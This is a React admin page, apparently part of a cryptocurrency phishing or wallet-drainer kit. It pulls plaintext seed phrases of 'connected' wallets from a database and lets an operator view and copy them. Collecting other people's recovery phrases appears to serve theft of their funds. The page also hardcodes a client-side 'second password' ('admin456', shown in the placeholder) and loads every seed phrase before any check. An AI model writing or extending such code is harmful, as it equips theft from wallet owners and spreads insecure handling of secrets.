'use client';

import { useState, useEffect } from 'react';
import { createClient } from '../../../lib/supabase/client';

export default function SeedPhrasePage() {
  const [secondPassword, setSecondPassword] = useState('');
  const [wallets, setWallets] = useState<any[]>([]);
  const [showSeedId, setShowSeedId] = useState<string | null>(null);
  const [timeLeft, setTimeLeft] = useState(0);
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [passwordVerified, setPasswordVerified] = useState(false);

  const supabase = createClient();

  // Fetch wallets
  useEffect(() => {
    const fetchWallets = async () => {
      setLoading(true);
      const { data, error } = await supabase
        .from('wallets')
        .select('id, address, seed_phrase, created_at')
        .order('created_at', { ascending: false });

      if (error) {
        console.error(error);
        setError('Failed to load wallets');
      } else {
        setWallets(data || []);
      }
      setLoading(false);
    };

    fetchWallets();
  }, []);

  // Verify password once
  const verifyPassword = () => {
    if (secondPassword === "admin456") {   // ← Change this if you want a different password
      setPasswordVerified(true);
      setError('');
    } else {
      setError("❌ Incorrect second password");
    }
  };

  const handleViewSeed = (walletId: string) => {
    if (!passwordVerified) {
      alert("Please enter and verify the second password first");
      return;
    }

    setShowSeedId(walletId);
    setTimeLeft(25);
    setCopied(false);
  };

  const copySeed = async (seed: string) => {
    await navigator.clipboard.writeText(seed);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Auto-hide timer
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (showSeedId && timeLeft > 0) {
      timer = setInterval(() => {
        setTimeLeft((prev) => {
          if (prev <= 1) {
            setShowSeedId(null);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [showSeedId, timeLeft]);

  if (loading) {
    return (
      <div className="min-h-screen bg-zinc-950 flex items-center justify-center">
        <p className="text-yellow-400 text-xl">Loading wallets...</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-zinc-950 p-8">
      <div className="max-w-4xl mx-auto">
        <div className="flex justify-between items-center mb-10">
          <div>
            <h1 className="text-4xl font-bold text-yellow-400">Seed Phrase Viewer</h1>
            <p className="text-red-400 text-sm mt-1">HIGH SECURITY — ADMIN ONLY</p>
          </div>
          <a href="/admin" className="text-zinc-400 hover:text-white">← Back to Admin</a>
        </div>

        {/* Password Input Area - Very Clear & Prominent */}
        <div className="bg-zinc-900 rounded-3xl p-10 mb-12 border border-zinc-700">
          <h2 className="text-2xl font-semibold mb-6 text-white">Enter Second Security Password</h2>
          
          <div className="flex gap-4">
            <input
              type="password"
              value={secondPassword}
              onChange={(e) => setSecondPassword(e.target.value)}
              placeholder="Enter second password (default: admin456)"
              className="flex-1 bg-zinc-800 border border-zinc-700 rounded-2xl px-6 py-4 text-lg focus:outline-none focus:border-yellow-400"
            />
            <button
              onClick={verifyPassword}
              className="bg-yellow-500 hover:bg-yellow-400 text-black px-10 py-4 rounded-2xl font-semibold transition"
            >
              Verify Password
            </button>
          </div>

          {error && <p className="text-red-400 mt-4">{error}</p>}

          {passwordVerified && (
            <p className="text-emerald-400 mt-4 font-medium">✅ Password verified. You can now view seed phrases below.</p>
          )}

          <p className="text-xs text-zinc-500 mt-6">
            This password is required to view any seed phrase. Each seed will be visible for only 25 seconds.
          </p>
        </div>

        {/* Wallets List */}
        {wallets.length === 0 ? (
          <div className="bg-zinc-900 rounded-3xl p-16 text-center">
            <p className="text-zinc-400 text-xl">No wallets have been connected yet.</p>
          </div>
        ) : (
          <div className="space-y-8">
            {wallets.map((wallet) => (
              <div key={wallet.id} className="bg-zinc-900 rounded-3xl p-8 border border-zinc-700">
                <div className="flex justify-between items-center mb-6">
                  <div>
                    <p className="text-sm text-zinc-500">Wallet Address</p>
                    <p className="font-mono text-yellow-400 break-all">{wallet.address || '—'}</p>
                  </div>
                  <p className="text-xs text-zinc-500">
                    {new Date(wallet.created_at).toLocaleString()}
                  </p>
                </div>

                {showSeedId === wallet.id ? (
                  <div className="space-y-6">
                    <div className="flex justify-between items-center">
                      <div>
                        <p className="text-red-400 font-medium">SEED PHRASE — SECURITY MODE</p>
                        <p className="text-sm text-zinc-500">Visible for {timeLeft} seconds</p>
                      </div>
                      <button
                        onClick={() => copySeed(wallet.seed_phrase)}
                        className="bg-yellow-500 hover:bg-yellow-600 text-black px-8 py-3 rounded-xl font-medium"
                      >
                        {copied ? "✅ Copied" : "Copy Seed"}
                      </button>
                    </div>

                    <div className="bg-black border-2 border-red-500/50 p-10 rounded-2xl font-mono text-lg leading-relaxed text-yellow-300 break-all">
                      {wallet.seed_phrase}
                    </div>

                    <p className="text-center text-sm text-zinc-500">
                      This seed phrase will automatically hide in {timeLeft} seconds for security.
                    </p>
                  </div>
                ) : (
                  <button
                    onClick={() => handleViewSeed(wallet.id)}
                    disabled={!passwordVerified}
                    className={`w-full py-5 rounded-2xl font-bold text-lg transition-all active:scale-95 ${
                      passwordVerified 
                        ? 'bg-red-600 hover:bg-red-700' 
                        : 'bg-zinc-700 cursor-not-allowed'
                    }`}
                  >
                    {passwordVerified 
                      ? 'VIEW SEED PHRASE (25 SECONDS ONLY)' 
                      : 'Enter password above to unlock'}
                  </button>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}